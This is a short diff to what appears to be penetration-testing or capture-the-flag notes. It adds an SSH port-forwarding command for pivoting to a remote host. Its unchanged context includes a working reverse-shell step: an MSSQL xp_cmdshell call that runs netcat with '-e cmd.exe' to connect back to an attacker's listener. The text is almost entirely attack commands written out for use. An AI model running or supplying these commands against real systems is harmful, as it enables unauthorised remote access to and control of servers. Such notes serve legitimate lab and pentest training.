@@ -64,3 +64,7 @@ Obtain reverse shell
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe [[$LHOST]] [[$LPORT]]"
 ```
 
+Estabish SSH tunnel (local port: `8888`, remote host: `localhost`, remote port: `80`)
+```
+ssh -L 8888:localhost:80 -i ~/.ssh/id_trash_ed25519 $RUSER@$RHOST
+```
